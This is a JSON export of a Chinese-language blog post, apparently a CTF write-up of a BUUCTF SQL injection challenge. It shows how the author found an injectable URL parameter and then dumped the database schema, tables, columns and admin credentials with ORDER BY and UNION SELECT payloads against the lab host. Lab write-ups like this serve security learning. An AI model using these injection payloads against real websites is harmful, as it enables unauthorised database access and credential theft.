{"title":"BUU-SQL注入-寻找注入点","uid":"61025c4bc325a8f722ff6e7c3ae2291b","slug":"BUU-SQL注入-寻找注入点","date":"2022-03-18T02:49:56.000Z","updated":"2022-03-20T11:49:02.076Z","comments":true,"path":"api/articles/BUU-SQL注入-寻找注入点.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。</p>\n<h2 id=\"0x00-启动靶场\"><a href=\"#0x00-启动靶场\" class=\"headerlink\" title=\"0x00 启动靶场\"></a>0x00 启动靶场</h2><p>启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有结果。</p>\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318105309711.png\" alt=\"image-20220318105309711\"></p>\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318105320103.png\" alt=\"image-20220318105320103\"></p>\n<h2 id=\"0x01-信息搜集\"><a href=\"#0x01-信息搜集\" class=\"headerlink\" title=\"0x01 信息搜集\"></a>0x01 信息搜集</h2><p>登录页面无果后，测试了热点页面，有三篇新闻，随便开一片后发现url的值在变化：</p>\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318105801150.png\" alt=\"image-20220318105801150\"></p>\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318105904675.png\" alt=\"image-20220318105904675\"></p>\n<p>接着查看源码：</p>\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318110010310.png\" alt=\"image-20220318110010310\"></p>\n<p>发现<code>content_detail.php</code>这里也有字段的变化，并且和url的<code>content</code>值相对应，那在这里就能大胆的猜测，<code>content字段</code>这里存在注入点。</p>\n<h2 id=\"0x02-判断字段数\"><a href=\"#0x02-判断字段数\" class=\"headerlink\" title=\"0x02 判断字段数\"></a>0x02 判断字段数</h2><p>既然探测出了 注入点，那接下来就需要判断字段数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 3\n\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318110444538.png\" alt=\"image-20220318110444538\"></p>\n<p>当判断字段数为3时无回显，字段数为2时，回显正常页面，那这里字段数就是2.</p>\n<h2 id=\"0x03-判断回显点\"><a href=\"#0x03-判断回显点\" class=\"headerlink\" title=\"0x03 判断回显点\"></a>0x03 判断回显点</h2><p>使用联合注入判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318110613534.png\" alt=\"image-20220318110613534\"></p>\n<h2 id=\"0x04-后续操作\"><a href=\"#0x04-后续操作\" class=\"headerlink\" title=\"0x04 后续操作\"></a>0x04 后续操作</h2><p>爆库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(schema_name) from information_schema.schemata<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318111344733.png\" alt=\"image-20220318111344733\"></p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318112641585.png\" alt=\"image-20220318112641585\"></p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;FLAG_TABLE&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318112730085.png\" alt=\"image-20220318112730085\"></p>\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select group_concat(username),group_concat(password) from admin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318112104664.png\" alt=\"image-20220318112104664\"></p>\n<p><strong>注：</strong>这里得到了管理员的账号和密码，在登录页面输入账号密码得到flag</p>\n<p><img src=\"/post/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9.htm/image-20220318112417918.png\" alt=\"image-20220318112417918\"></p>\n<h2 id=\"0x05-总结\"><a href=\"#0x05-总结\" class=\"headerlink\" title=\"0x05 总结\"></a>0x05 总结</h2><p>这道题最主要的难点在于寻找注入点，找到注入点之后，后续操作也就水到渠成了；其次就是信息搜集的重要性，若不花时间去信息搜集，在测试过程中往往很难继续往下进行。</p>\n","text":"前言记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。 0x00 启动靶场启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有结果。 0x01 信息搜集登录页面无果后...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"},{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00-%E5%90%AF%E5%8A%A8%E9%9D%B6%E5%9C%BA\"><span class=\"toc-text\">0x00 启动靶场</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86\"><span class=\"toc-text\">0x01 信息搜集</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0\"><span class=\"toc-text\">0x02 判断字段数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%82%B9\"><span class=\"toc-text\">0x03 判断回显点</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E5%90%8E%E7%BB%AD%E6%93%8D%E4%BD%9C\"><span class=\"toc-text\">0x04 后续操作</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x05 总结</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU-BURP-X-Real-IP","uid":"eefdee94a2ec4b5d372ab4adce8d3bac","slug":"BUU-BURP-X-Real-IP","date":"2022-03-18T08:10:44.000Z","updated":"2022-03-20T11:48:28.751Z","comments":true,"path":"api/articles/BUU-BURP-X-Real-IP.json","keywords":null,"cover":[],"text":"前言BUU一道BURP的题目，并记录一下X-Forwarded-For和X-Real-IP的区别。 0x00 启动靶场看到只能本地访问，一般看到这句话的时候肯定首先想到的是X-Forwarded-For，但是数据包中加了X-Forwarded-For也没什么作用，翻了几篇帖子看到...","link":"","photos":[],"count_time":{"symbolsCount":512,"symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"东塔靶场-CTF-命令执行_2","uid":"8ced8e9ea7483c651973016447b0e3bf","slug":"东塔靶场-CTF-命令执行-2","date":"2022-03-16T00:50:33.000Z","updated":"2022-03-16T02:07:48.444Z","comments":true,"path":"api/articles/东塔靶场-CTF-命令执行-2.json","keywords":null,"cover":[],"text":"前言东塔靶场一道关于MD5强类型的题目，感觉有点有趣，记录一下。 0x00打开靶场，提示有趣的md5，并且地址栏中像是被base64加密过 查看源码，最可疑的是这张图片的地址，base64加密 先解码，得到是dota.png这张图片 0x01先将url解码试试 解码前：TmpRM...","link":"","photos":[],"count_time":{"symbolsCount":"8.9k","symbolsTime":"8 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}